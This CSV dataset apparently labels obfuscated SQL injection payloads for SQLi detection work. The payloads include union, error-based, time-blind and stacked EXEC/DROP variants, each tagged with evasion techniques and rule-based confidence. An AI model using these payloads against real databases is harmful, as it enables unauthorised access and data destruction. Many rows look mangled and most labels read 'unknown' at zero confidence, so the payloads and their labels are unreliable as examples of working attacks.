payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
"1% )? | ) !)aS faxR where 0x4F0b11b1b10501100107010=4o0X0X3F24 Or&0o0X2O0O3Fe (LiKe ( sElECT?COuNt' (% * ) from alL_uSers t1,All_UsERs*t0b10,aLl_usERS t0,AlL_useRs*t0o0o0o3,All_userS T9b505\ )` aND ^TrUE oR FAlse Or 0x0O0 or['fL' not LIkE 'fL' Or FALSe/**/ +aNd !(SeleCT (SELect (sEleCt (seLEct 0X1)))) OR faLSE ANd{(SELEct (selECt (sELect (seleCT (SELECT (SELECT (SELECT 27)))))))!=0x1b or FAlSE anD 0x14e0=0X24E0 AnD TRuE OR False --T[N",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"1"" ); and (sEleCt 9O0B0x1E4C) LIke /*rRI(7X1]4Q^r7{lqI{U*/DBms_UTIlIty.SQlid_tO_SqLhaSh ( ( ChR ~( (seLeCt (sELECt 103)) ) Or ChR ( (SeLEct 0B1130001)>[)/* |Kf9CIuCC$0AP*/ ||ChR! ( (SeLECT (SEleCt 0x4C)) )% OR CHR ( `4XBA ) OR Chr= ( 0X71 ) or ( sELECt? ( CaSe wHEN ( (SELect (sELect 0X1e4c)) lIke 0x1e0O5O5c )' tHen (sEleCt (seleCt (seLECT (seleCt (sELect (SELEcT (sELeCT 1))))))) elsE (seleCT 0X0){End ) FROM DUAl} ) [ oR CHr ( (SelEct 0XB7) ) ||[chR/ ( (select (sELEct;(sElect 0X336))) ) or CHR ( (SElEct 0X76)\ ) or chr: ( -(SELECT (sElect 0X0x51)) ) or;cHR) ( }5x71 ) +) ) ANd ; (! ""VuRB""<= ""VUrB",error_based,oracle,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.51,rule,sqliv5_json,unknown
1'+ ](_`SElect 'vJOJ' WHere (SelECT 0o0b101x14e4) LIKe 0O12414,unknown,unknown,case_variation|scientific_notation,0.0,rule,sqliv5_json,unknown
"4%' } ) ""% ) `And Char (* 0X2O153 )+ Or ChAR ( (seleCT (sElECt (SElECT 6x8d))) ) or cHar- ( 0B0X4b? ) Or ;cHar} (@ 0O0X0X3b ')+ lIkE RegEXP_sUbStrIng (/**/ repeAT ( Left ( cryPt_kEy ^( ChAr?]( (SELECT (SelECT 0O621)) )? OR<cHAr ( ~0X55 ) Or _cHar {( 0X0o95 ) ,Null ) ,(SELeCt 0o8o3x7) ) ,0B11x0X0b0O1DCD0X0o0B11110110001/*!iqKT(9nRoBeF3Gw&*/ ) ,NULl ) AnD TrUe aND .'S'='s' && (SElect (SELecT (SELEct (SeLeCt 0X1E8))))=0X8O7e0o6 && tRue and tRuE oR =""<"" noT Like ""<"" oR 0X0 ANd TRue or 0x0b10411011C LIKE (sElect 0X0X155d) OR falsE && (SElEct (seLect (SElECT (SeLEct (SelECT (SeLECt (SELeCt (SELeCt (sElEcT 1))))))))) oR False OR FaLse --",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.8,rule,sqliv5_json,unknown
"0o0b0o9'$"" .+ Or * }~( [SeLeCT 'Xuou'^from DuaL%wHeRe:2B0B110X0b0o9b105X1E51 lIKe 0X6x0X1E01:Or$EXTracTvALUe; (; 8X5B110A0,COnCaT ( 0O10X0C,0O1b0x0o03255055a0X4x2F, ( <SEleCT ,;( ?elt* (\ (SELect-0o8b0x511) =\/*W)w.Miu*oUwH*EweITK`cK; D~RbV*/0X511,0x8 }) <)_ ],) ],0b4X217a0O10O0x0b110110011a2X0o0x0O2f +}) / )._ <) OR? '",unknown,oracle,case_variation|inline_comment|hex_string|scientific_notation,0.06,rule,sqliv5_json,unknown
0O0b0b1107101B0b110x0O0o2o5O4b4B1]\[) /-~)|/*<vJB$*/ as/VRyV|WHere]4X1878]= 0o0X15E8X0o0,unknown,unknown,comment_whitespace|inline_comment|scientific_notation,0.0,rule,sqliv5_json,unknown
"5"" @). ) ) [Or ChaR ( (SeLeCt (selEcT (seLect (SeLEct (sEleCT`0O3x84))))) )} oR)CHar ( (SElect (sElecT (sELECt 9X5x0b101101))) ) or CHaR ( _(sElEct 0x0X1f0X3) ) /*;kw/(sElECt (SELECT 4))*/ or *CHAr ( 0O4X0b7140108 ) liKe > REgExp_suBSTRIng }( ^REPeAT ~( lEfT ( CRypT_KeY@ ( cHar; ( (SELEct (seLEct 5x0O51)) ) oR ChAR ( (SeLecT@0O0x45). ))* or ChAR ( 8x0b510101 ]); ,nuLl [) ,0b7O0O2O0X7 ) ;,0b0x3X38E1F0b1100010001011012F63AaDe0O0B111101B3D70 ) ,NulL ) && ; ; ( >( _""DqIS"" Like ""DQiS",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|scientific_notation,0.0,rule,sqliv5_json,unknown
"1' WhERE (SeLeCt (SeLeCT (SELeCT (SelECt (sElECt 0828))))) liKe] 0x2E0b1011110;oR^0x0o2102 ^lIKe "" (( selECt 0O0X27ec fROM_pG_SLeep ( <(sELECt (SELeCT (SELeCt 0X5))) )[ ) OR 'KE' NoT lIKe 'KE' OR FALsE/**/or FalSe oR 0X0""--",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,string_single_quote
"1%' [) =)' Or (SElecT (seLECt 0B0X1050))> liKe<_, ( sELeCt 0b0x48c299be0b7[FROM pG_slEep ( (seLEcT 0X2) ) <, ) OR 'O'=like''OK' oR (sELeCt 0xC0B0x3E8a) NoT/**/ LIKE 0O0xC0x8a and TrUE oR OR FaLsE && |(SElEct (sELeCT (SeleCt 0x1)))#FaLSE AND tRue"" and 0xf3A nOt LiKe (sELECt (SeLeCT (sELecT 0B101xf3b))) --;^b",unknown,postgresql,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.06,rule,sqliv5_json,unknown
"0O3"" ) ) oR`9X2O0b4b0B0b0o0B0b100107111151\~LIKE | (( sElEcT CoUnT ( *<[)/**/ frOM)RdB$fieldS/*T+S/CW(wBf`(SeLECT (SeLECT$(sElECT 0x3))).*/AS/*[0X1fA(;?%Yu^*/T0o4,RDb$tYPes As T7X0o6,rdb$CoLLATiOnS AS t4B41,RDB$FUnctionS~AS T0b0B100 /*k)+|Or FalSe && (sELeCt (seleCT (Select (SeleCT (sELEct (SeLeCT (SELECT 1))))))) Or ""oE"" LIke ""OeA"" and tRUe#gIjq=Tt*/)` / AND trUE[And ""vexI""!nOT likE ""vEXI!""]ANd TRue aNd 0B1011001110093?Not LiKe; (SeleCT;0X14E1)[ OR ""jI4"" nOt LikE ""JI4x0o0o4"")ANd""truE aNd` TRue AnD<0X83d`lIKE (SElECt;0b100057101101){--:z`",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|scientific_notation,0.0,rule,sqliv5_json,unknown
"0B111b1%' ( SelEcT ( caSe$WHen+ ({ (SeLecT.8X09e0B100)=0o0x0b0o0B10a0B0B11010110110111011 ) tHEn RegeXP_suBSTRINg ( RePEAt ( lEfT \(`?CRypT_key (, CHAR ( 8x48/*Ak )YQC/?,(SeLECt (sEleCt (sElecT (sELEct (SELect (sElECt (selEcT 0O0x3)))))))/%JKh3]h/GD+g]~Gs8bkYO;aA dAc*/ ) - Or Char ( &0b0O105 _) < Or chAr ( 0X0O65 <) ,nuLl {) ,0x4X0 ) ,0b0b1001007001120010000110100011110010011010001100110101010100010100010110101010010111100011110101 ) ,nULl ) ElsE chAr/*]B;3s*/ ( (SeLeCt (selEct (sEleCt (SELecT (SELect (SELeCT (seLECt^0b0x0B10E))))))) ) ] ) or cHaR >( (SEleCt (SEleCt 0B0b0X0X0b101100)) ) oR cHaR ( 4B1101101; ) Or CHAr\ ( (SeLEct (sElecT 0x48)) )+ EnD ) FROm ( VAlUEs, ( 0o0X2 ) ) ) &&& '%'='",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"8' || /*R\?S@Lpme/+a^Ups`pA;*/.(! Select 'bVIC' FROM~duaL/WHeRe^0X0x59e7=4x0O0o0b0B1120E9X6\< OR 0xa1x0o0o75~=)Dbms_PIPe.rEceIVe_mEsSaGe/*G(*/{( _chr` (+ 2x0O0b0X70 )?; or Chr ~( (sElECT 6b3910105)~ )& %Or`chr ( [(SeLECT (seLeCt?(SELEcT_0X41)))+ ) oR cHr `( 0b0x0x65 /*I5k\`O/HqGRo.;SCh3AvO*/) $,0x8o0 `)[~} ); oR '",unknown,oracle,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.11,rule,sqliv5_json,unknown
"6x0o0x0o0o0b0xco9B0b0b1101111%""? ) `;UNiON~All SeLECT nulL,NUlL,NULl,NUlL,NUll,NulL,NULl,nUlL,NULL,null^ OR @False AND`0x5e48 != 0o0b0b10110101111001101001100101111010000101000111111[AND True AND 1#wu8",union_based,unknown,case_variation|hex_string|scientific_notation,0.8,rule,sqliv5_json,unknown
"1%"" ) )) ` ) | ( seLECT (; case WheN (; 0B1o12513 lIkE 0B1110101001011 ) tHEN/*(N*/regeXp_SUbStRInG ( repEAt :( RIGhT< ( cHAr]/*><BZr{gf* ;@Dy (SELecT (seLeCt (sELEct (SELECt (SElecT (SELECt 0x1))))))*/( 2o0O3o12043 ) ,(seLeCT 0X2b0X3e8) ) ,0B1o0B0B10001010111101111000110101011000010101101001000010101001101001010100100100000000001100001100111000000000 ) ,nulL ) eLsE cHar ( 0o4b0O154` ) or chaR""'( '4x0b101C )?/*]`(SELeCt (SeleCT (SELECT (SELECT 57)))) */ or, chaR"" ( 0O0x0o106/ ) ;OR CHar ( (SeLeCt (selECT 0o0O3X7o113)) ) `enD ) fROm?INfORmAtIon_ScHEMA.SySTem_uSErs_%) && (+ ( (+ ""%"" LIKE """,unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|scientific_notation,0.0,rule,sqliv5_json,unknown
"0O1"" PRoceDURE AnalYse ( ExTrACtvAlUE ( (SeLECt (SelECt (selEcT (selEct 0X26E3)))),ConcaT/**/ ( !0X5C, ( BEncHMarK ( /*Et~e*/(sElECT 0x4C6e68),MD0O5 ( 0O0O0x9o0o436013a50 ) ) ` )= ) ! <) ,(sELecT (SElect (SeLect 1))) ) ANd ""ONsd"" LIKE ""onSd",error_based,mysql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.44,rule,sqliv5_json,unknown
"0O1'( ) ) , anD 0X4e7C Like DBMS_utIlIty.sqLID_To_SqlHasH ( ( ChR`^( 0X0B0X0O0B1101015 ) Or chR (/*;o^|\0B101Ja/V*/ 0X6O107 ) or cHr ( (sELEcT (select 0x73)) ) or CHr ( +(SelEct 0X0b110A) |) oR ChR! ( (SELeCT (SElECt (SeLect (SeleCt 0x74)))) )< OR }( sElECt ( case WheN , ( (sELect (SeLECt 1o0X0x8e4C)) lIKe (seLECt (SElect 0X1a64)) ) THen 0X1 ElSE (sELECt (seleCT 0X0x0B1)) end ) frOM dUAl ) Or chr (< (SElEcT 0X71) ) . OR chR }( 0x7a ) OR chR ( 1b4x26 ) ||Chr (~ 2x0x0b113a )@ `OR CHR ( (selECT[(seLecT (sELECt (SELEcT (SElECT (sEleCt (SEleCT#(sElECT (SElecT (SELECT (SELECT (SELECT 113))))))))))))| ) ) ) ANd [`(/**/^! ( 'MMfQ' ?liKE 'mMFQ{",error_based,oracle,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.51,rule,sqliv5_json,unknown
"1"" `) ) && ChAR ( (SELecT (SELECT (selecT 0X76))) )} oR `chAr (% 1x4d ) Or ChAR (` (sELEcT (SElECt (SeLEct (Select (sEleCt (sEleCt (SELecT (SELECT 182)))))))) )| or ChAr ( 8X5o22: ) lIKE RegexP_suBStriNg ( rEpeAT (,^lefT ( crYpT_Key (& chAr ( 8X4D ) Or cHAr ( )0X25"" )= or CHaR ""( (SELEct((SElEcT (SelEct (sELECt 0X51)))) ) ,nuLl ) ,0X0x0x0X0O4 ) ,0B0x0B1DD94E9C ) ,NUlL ) ANd ( ( ""eGXe""=""eGxE",unknown,unknown,case_variation|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"0o5O0X1' ) AS^SjMT wheRE (SELEcT?0x193D) LIKe (SELECT (sElEcT\0x0o316D)) Or 0X0B10100E5 = ^ ( SeLEcT=CoUNt@ (! * )^@ froM GeNeraTe_SerIes ( 0X1,0X4F0a60 ) ) OR ""dx"" NoT LIKe ""DX""&&'M' LikE 'M' &&> truE or fAlSE oR falSE or fALSE OR (SelECt (SElecT (SElECT (SelEcT (SELeCt (SELECT 0)))))) OR ""G[s""<>""G[s"" --",boolean_blind,postgresql,case_variation|function_alternative|hex_string|scientific_notation,0.41,rule,sqliv5_json,string_double_quote
9' /**/ ) ) +(rliKe ?*( sElEct ({(CaSE+WHen} @(* (SeLECT?4b1x20e0x3) lIke >0x0o0b10b60001041410104_ )^ ThEN@(seLeCt 0b0b0X1)=ELse 0x0x0x0b0b1111101001O0b0B11101110000100010110010=ENd/*SArKP9;*/+ )/*(Bg*/ >)/*(SElEcT((selECT<2B10))M q*/ &&/*0b110lO7h*/ `(/ [( 'fbJF'='fbJF,unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"5%' ) ) ) + ( ~SeleCT ( CaSe WHEn ( 0x0X158b lIke 2X0o0x154b> ) tHeN rEgexP_SubStRINg` ( rePeAt ( RIghT ( chAR ( 0O12573 ) ,0X9 ) ,(sEleCT 4x0x1E0b0xf17DE97056aD377) ) ,nuLL ) eLSE chAR ( (seLect (SelEcT 6X6c)) ) ; or%cHaR: ( (SELECt (seLecT 0X88)) ) oR ChAr ( {(Select 0X0o106) ) oR chAR ( (SEleCT (sEleCT (select|(sELECT (sElEct 0X0x9C))))) /*(sELeCt (SelECt (SELEct (sElECt (seleCT 9))))) OR false#8gn\x:**/) EnD ) FrOM iNf Or MaTiON_schemA.SysteM_USeRs( ) anD ? ( ( , ]( #'%' [LikE 'l",unknown,unknown,case_variation|inline_comment|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"0O3' ;)/*hy0)gC0O4 bw?i*/ ) ) oR :5x6o7b1382011Ab{=likE ( (selEct counT, (, * ) from{DOmAiN.DOmAInS`aS@T0b210,DOMAiN.cOluMns as T5B0O0o0b1012,domAIn.tablES/aS t0o0b3x0O0b0x3e8 ) < && ;( {](/*(SELecT (seLEct (SElecT (sEleCt=(SELECT 8)))))^*/ '/ ([^'OdkR'/**//*O[Ln@gtRA|sU,aUL'[JQ0U>9x7~ */ lIKe +'OdKR",unknown,unknown,case_variation|comment_whitespace|inline_comment|scientific_notation,0.0,rule,sqliv5_json,unknown
"7B0X5O0o0o0XbX6X5x0O9O0X2aO0o8b0x3f2' IN}boOleAN:MoDe[@)!,]UniOn<ALL/*.M\jl's(yOD*Dx29 1o543XZzCRT Pw5h$*/SELeCT/*J]0B0o0B0X0B1097O2B2o6x7x3e0O19O0X0x0B0X0O3X3B0b0O0i"". LJF0O6-HoHF&M*k1sCO*/nUlL,nULl,nulL,nULL,NuLl,null,null--",union_based,unknown,case_variation|inline_comment|scientific_notation,0.8,rule,sqliv5_json,unknown
SeLect ( casE wHEn ( (SelEcT~3325) LIKe 0X6E0o7 ) then (seLeCt (SELeCT 0b111101010101)) else/*RCb8*/(Select (SELECT 3385))* ( sElecT 0o6345 FRom mYsQl.db ) End ) oR<FALse or\0X0 oR FaLsE AND True# ZSzm,unknown,unknown,case_variation|comment_whitespace|inline_comment|scientific_notation,0.0,rule,sqliv5_json,unknown
"0x1'_In BooLeAN MoDe ) AND (selEct 0o0X0x487) LIKE ConVerT /*y+N %oa/H */( INt, ( seLECt CHar ( 113 ) +CHar ( (SeLEcT (sEleCt (sELECT 313))) ) +char (@ 0O634 ^)} +ChaR ( (SELECT (SELECT 106)) ) +Char ( 0x71 ) + ( SeLECT ( Case when ( {5X1091 LIKE 0x6X1091 ) thEn CHAr ( *0B0b0x19E1A *) ELse char ( (sELect (SElEcT (SELECT 48))) ?) enD ) ) +CHaR ( (sElEct 113) ) +CHAr/**/ ( (SELECt](selEct (SeLEct (sEleCt (SElECT 122))))) ) +char ( `(SelEct 0X76) )} +CHaR ( (seLECT 122)} ) +chAR ( (SELEct 0o161) ) ) () AND TruE oR 0O0X0 OR fAlSe or (sELECT 0) or fAlsE OR 5915 != 5915 OR FaLsE OR falSe And tRUE or fAlSe#0B0H:^CV^Ej=G1>G&1",error_based,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.8,rule,sqliv5_json,numeric
"1 $ or (SeLect (SEleCt 0x20E5)) =^ ( SElect coUnt ( * &) ) From GenerATe_serieS ( 0o8,(sELeCT 0O23046140) ) ' ) aND 0X0o14B0O1 IN ((sElEcT (seleCT/*W~(SeleCT (SELECT 9)) A1nyIGR&c*/(Select (SeLecT (SELeCT 0X0XCb2))))),0x12B3,0x12B4) oR "" Or falSe or 0X1F7E!=(sELect 0X1f6e) Or fALse#n"" noT lIke ""#n""# JMkIk.",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.46,rule,sqliv5_json,string_double_quote
"]SElECT * frOM UsERs WHERE OR>(SelEct 0o0o6)[OR FalsE Or 0X0b10101E4 NOT LIKE (SeLect (seleCT (SELECT 0x0b10101e4))) AND 'N' Not liKE,'N(' Or 0 OR False AND True AND (SELECT (SELECT 1)) OR ""L""<>""L"" AND (SELECT 1)#ID =& '3o0xA' OR @ @(sElECT (SelEcT (seLect 4)))$&like 0X2^UNIoN*SeLEct (selEcT~0x1),VErSIon< ( ) [--$0b0b0X8o0b1001'/58EF9L _vKX",union_based,unknown,case_variation|hex_string|scientific_notation,0.8,rule,sqliv5_json,string_single_quote
SEleCT *[frOM/*~|VYnD0)UYUgGhcrobLZUaP MH*/userS where id LIKE '0b0O1'&OR|\.<\ or (SELeCT (SELEcT (seLeCt (seLEcT 0x3)))) =* 0O0X1>ANd=9x0B2X4e9 OR FalsE ANd 'xw'+not likE 'xW[' And&TrUE or FALsE -- 2'xa}<]s5I,unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|scientific_notation,0.0,rule,sqliv5_json,unknown
"seLeCt""* fRoM USerS WheRE Id=(SElect (seLECT (sElEct (SelecT 1)))) OR @ Or ""-Es*A"" LiKe} ""-Es*A%"" aND TruE And TrUE#"", =/*FW */ (SeLecT (selEcT 2X1)) UNiOn)SeLECt 0X9,verSiOn ^( < ) -- 0B9o0X0b5X3E9Gj",union_based,unknown,case_variation|comment_whitespace|inline_comment|scientific_notation,0.8,rule,sqliv5_json,unknown
"DEclaRe @S VaRcHAr\ _()((SeLECt (SeleCT&3Xc9)) ) \ SeleCT""@S =!1o0x71256c0O0XCfF930e6E1aA2b8623dd4f0X9e ExEC/*0x OR FaLse AND True OR 0#;9X6*/;(&(@S: ) J%",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"select * FRoM usERs.where-iD like 0x0O1 Or \<\*UniON selEcT nuLL,@@verSioN OR\ (seLeCT 0x162) <> (seLECt (SelEcT 0B0x92e7780)) oR falsE OR False OR False OR False -- 0B1Vm;ki",union_based,mssql,case_variation|hex_string|scientific_notation,0.46,rule,sqliv5_json,unknown
"sElecT * froM}USErS wHerE+iD 'likE/**/@4b11x3 Or _"") ) _( "" LIke 0x0o2 oR*(SELEcT (SEleCt (seleCT 6x2)))/*p(ij])Z}<pO\D*/ =. (selEct)0x0) aNd 0b0x1985E0X781bBC nOT LIkE (selEct 0X22F1) oR 0B0X0O3753 NOT liKE 2x1065 or faLSe/**/ and -(SElecT 6x0B1) oR,0X4X0x0 or fAlSe && ~ ""@"" LIke ""@"" or falsE aND?TRue And]TruE(Or falsE:oR^faLsE or FaLse oR fALsE OR (SeLEcT (selEcT (sELecT 0))) --)(SElEct (SelEct 0x0X1O0X6O1))^wpT{j",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"-SELect * From_Users WheRE id=(sElecT 0X5) OR 0o0b0b1111X4 ANd TruE ANd^0o3114 LiKe /**/(SElECt (Select (SeLeCt 0X5e8))) oR% 0X0b0B2 anD ""Q~L+"" noT LikE ""Q~l+V"" And TrUe&and (SeLEcT (sElECt (SeLect (seleCT 9x256b)))) not lIKE (sELeCt 0x0X13b4) ANd 0B0x0B1 Or FAlSE and/ &RO*/M_@*/TRue||false OR fAlSe Or falSe#"" ( uniON SeLEct)vErSion ( )~ ,vErSIOn %( ) --)2h/{dl: H^ozP",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|scientific_notation,0.8,rule,sqliv5_json,unknown
0X0x2b83e86ec0o146437527652365446022713425763400244=...,unknown,unknown,hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"DeCLARE @Q>nVArcHAR^ .( -0xc8/ )/ 0x740065006C0B0X1D8x10bB0o5B700BF0b11110111101b61bdbD8b3FDa123Bb80ef0X6e02,ExeC (/ @Q );",unknown,unknown,hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"1 )/ ) oR :BEnchmArk ( (seLECt (selEct 0X989684)),MD7 ( (SELECT 1) ) ) oR (SELECT 1772) liKE (sELEcT 0X1e35) aNd#(selecT 1) ANd/*:;;*/TRuE OR faLSe && 1}OR fALsE#PF0x0b180uiy",time_blind,mysql,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.45,rule,sqliv5_json,unknown
"SElect:* FrOM UserS WHeRe;Id = '3o0O0o1' OR \<$ uNion<sELEcT/**/(SELEcT (SEleCt (SeLECT 3x1))),@@VeRSION?Or 0b0o0x80e0O0[NoT=0b4b1000011101004 OR\fAlSE :OR ""MK"" nOt lIke ""MK""?OR;"",""/*Oh*/ LIKE+ "",7"" oR{FAlSE OR ""c/yc""<>""c/yc"" --]2'",union_based,mssql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.46,rule,sqliv5_json,string_single_quote
0x730065006c0b11101001001100101101101111011011100010000101111110001100110000001101101100001101111011011110110001011001111111101101000011000001110111011100000001110f0b110e0b0 exec (/**/^@q )/,unknown,unknown,comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"0o4', ( sELECT ^ (. case whEN }( ?0x6x24E9/ LIkE (sElEct (SELecT (SeLecT 0X2475))) ) ~ tHEN SleEp$%( (sELeCT 0X5) Or '?aBx[' NoT LIke '?Abx[' and truE or FaLSe && TrUe OR (SElECt (SELECT 2))# ) ~eLSE (sElecT 0X0B0o0O0x24E3)* ( &SeLeCT 0b0b13243011180011 fROM InForMaTIOn_scHeMa.chaRActer_sEtS ) end )? ) D];N",unknown,unknown,case_variation|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"1 ) ) ` ANd (seleCT (SeLEcT(5B1100511133030)) liKE (. 'qQPjQ'< OR `*( :sELect Case (sELecT 0X0o0X6O3604) wheN|(SELEcT 0B0o1o7x1880) TheN 0O3B0O1_eLsE^(Select (sEleCT (SeLECT (seleCT 0x9)))) eND frOM{rDB$daTaBasE ]) Or]'qzVZQ'.*) ANd LiKE ( <( 8o6x0B5X2ae3e5B18 /*;A+!SE*a%T_NlI2:(SELECT 5)*/=, 0X196",unknown,unknown,case_variation|inline_comment|scientific_notation,0.0,rule,sqliv5_json,unknown
if ( (seLECT 0b0x9184e81e62f) ( LIKe ((SElEct (SElEcT 0B0O0xaB)) .) / SelECT 0X1Ff8 eLsE dRoP FunCtION MBiH--,unknown,unknown,case_variation|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
8%' ; .AND\{OH0o2*/(SeleCt (selECT 0x0O8E6f)). =^\0x11f3*Or*0o0b0X0 oR%(SELecT 2932) <> (SElEct (selEcT 2938))| aNd/**/((seleCT 0x3) oR (sELecT 5639)!=0x1643 Or FAlse#K Ie`$%F,unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"0B1 [) < && CHaR^ ( -(sELeCT aNd+(seleCt (SElECt (SelEcT 0B0x0O1))):aND (SElEcT 5x0O1) oR FaLSe oR FaLSE or FaLSe Or fALsE aNd 0X0o13c!=(seLeCT (sElecT (SELeCt (sEleCT (SELECT 285))))) Or fALsE aNd TRuE oR faLse oR faLsE or ""+"" LIkE ""+<""#(sELEcT 0X6f)) ) ||cHaR: ({ 0X0o0B100D ) Or CHar ( 0X39 $) oR chAR ( (0b0B0x3B311010 ) LIke ReGexp_sUbsTrinG (* repEAt ( LEFt _( crypT_kEy ( cHAR }( 0x0x41 {)\ OR/cHar= ( (sELECT 0b0x48) ) ||/*DY*/chAR (| (sELecT (sELeCT-(SeLect[0X53))) )/=,NULl !) ,0b0X0 ) +,0x0O0x240F0b110101401100\ )>{,nulL <) AnD }(~:(sElEct/*(seLECt (SEleCT (seLECT (SeLEcT 0x4))))!G+aIp*/0x22E1)& like~ 8920i(WDVRuP1nU6in]",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,string_double_quote
"@eND! aND:.""lIkE((*\/*)Jb>h0O0b110o6B14x0b7B9O0o0 eu4e9Pu*/*(>`.""RQaY"" likE>""rQay",unknown,unknown,comment_whitespace|inline_comment|scientific_notation,0.0,rule,sqliv5_json,unknown
"0b1'+ %(/>sELECt$SyRZ+WhEre 0o8X0X0B1e13""`like &0x1e0XD uNIoN_aLl!sElECt_null,nuLl,null;oR 9X96BB nOt LIke 1X19bb or_False AND True OR False#%\VBYuGx4X6FB4Wm6g3",unknown,unknown,case_variation|scientific_notation,0.0,rule,sqliv5_json,unknown
"1' _ ) ) aND true && tRue Or 0 And TRue and (selECt (selecT 1)) OR False#) anD ROw ( (sElecT 6637),(sELECt 7469)/ ) > ( sELEct cOUNT ?( * ) ,cONCat (& 0b0x0x6D6E7aa0O107, ( .SelECT ( eLT, ( (sElecT/**/0x185d) LIKe (sELECT (sELect((SELecT 6230))),(SELecT (SeleCT 1)) ) ) ) ,0X0X0O1315a767A21,FLoor ( r&& ( (sELecT (seLect 0)) ) [*(SELECT 2) ) ) X FroM> (- SEleCt 5192 uNiOn sElecT 1185 UniON selecT 0Xf5b uNIon SeleCt (seLect 7148) ) A group bY x ) And ( ( ( 'eJUL'='ejuLz . @fa",union_based,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.8,rule,sqliv5_json,unknown
"cAll REgEXP_sUbsTRiNg ( RePeat *(/*kJL=U !;*8l*/ rIgHT ( chAr`|(:}0B101XE1X4c ) ?,0o2o0B0. ) ,(SELeCt 7b2x4X1dcD3x0o0o4E7) )(;,NULL> )] and :!( ?( [""eEVK"" lIkE ""eeVK",unknown,unknown,case_variation|inline_comment|function_alternative|scientific_notation,0.0,rule,sqliv5_json,unknown
"1' =)) WhERE*2X0x1e45=5x1Dc4 rLIke ( sELECT JQVO9*/**C{ **/frOm (/*.\U*/ SeLecT ( slEeP] ( 0B6x0O4x4 ); ) + ) ~vWYq ) And tRUE AND TRUe or`""N\Zl"" = ""N\ZlU"" OR[(SeLect (SeLect (SELeCT 0X3))) oR FalsE Or ' ' NoT lIke ' ' aNd tRUe oR faLsE oR?""e?""!=""e?"" oR FaLSe anD trUE oR (sELect (sElEct (SELECT 0))) aND TRUe oR fAlSe OR False# )?l! WjzM",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,string_double_quote
